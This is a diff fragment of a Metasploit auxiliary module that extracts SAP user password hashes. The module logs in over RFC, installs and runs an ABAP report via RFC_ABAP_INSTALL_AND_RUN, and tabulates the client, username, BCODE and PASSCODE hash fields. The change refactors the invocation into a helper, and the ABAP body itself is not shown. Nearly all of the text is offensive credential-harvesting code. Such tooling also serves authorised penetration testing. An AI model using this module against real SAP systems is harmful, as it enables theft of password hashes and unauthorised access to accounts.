@@ -48,10 +48,18 @@ class Metasploit4 < Msf::Auxiliary
   end
 
   def exec_USR02(user, client, pass, rhost, rport)
+    saptbl = Msf::Ui::Console::Table.new(
+              Msf::Ui::Console::Table::Style::Default,
+                'Header'  => "[SAP] Users and hashes #{rhost}:#{rport}:#{client}",
+                'Columns' =>
+                          [
+                            "MANDT",
+                            "Username",
+                            "BCODE",
+                            "PASSCODE"
+                          ])
+
     login(rhost, rport, client, user, pass) do |conn|
-      conn.connection_info
-      function = conn.get_function("RFC_ABAP_INSTALL_AND_RUN")
-      fc = function.get_function_call
 
 code = <<ABAPCODE
 REPORT EXTRACT LINE-SIZE 255 NO STANDARD PAGE HEADING.
@@ -65,25 +73,10 @@ FORM loop_output.
 ENDFORM.
 ABAPCODE
 
-      code.each_line do |line|
-        fc[:PROGRAM].new_row {|row| row[:LINE] = line.strip}
-      end
-
       begin
-        fc.invoke
+        result = rfc_abap_install_and_run(conn, code)
 
-        saptbl = Msf::Ui::Console::Table.new(
-                  Msf::Ui::Console::Table::Style::Default,
-                    'Header'  => "[SAP] Users and hashes #{rhost}:#{rport}:#{client}",
-                    'Columns' =>
-                              [
-                                "MANDT",
-                                "Username",
-                                "BCODE",
-                                "PASSCODE"
-                              ])
-
-        fc[:WRITES].each do |row|
+        result.each do |row|
           string = ""
           array = row[:ZEILE].split(/ /)
           array_length = array.size
